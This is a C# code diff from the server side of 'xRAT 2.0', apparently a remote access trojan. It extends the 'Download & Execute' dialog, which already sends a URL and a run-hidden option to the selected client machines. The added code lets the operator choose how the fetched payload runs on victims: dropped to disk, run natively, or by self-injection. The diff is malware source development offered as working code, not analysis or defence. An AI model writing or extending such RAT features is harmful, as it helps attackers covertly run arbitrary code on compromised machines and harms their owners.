@@ -17,11 +17,24 @@ namespace xServer.Forms
         {
             Core.Misc.DownloadAndExecute.URL = txtURL.Text;
             Core.Misc.DownloadAndExecute.RunHidden = chkRunHidden.Checked;
-
+            Core.Misc.DownloadAndExecute.Type = GetInjType();
             this.DialogResult = DialogResult.OK;
             this.Close();
         }
+        private string GetInjType()
+        {
+            string type = "drop";
 
+            if (rbNative.Checked)
+            {
+                type = "cmd";
+            }
+            if (rbSelfInjection.Checked)
+            {
+                type = "self";
+            }
+            return type;
+        }
         private void FrmDownloadAndExecute_Load(object sender, EventArgs e)
         {
             this.Text = string.Format("xRAT 2.0 - Download & Execute [Selected: {0}]", _selectedClients);
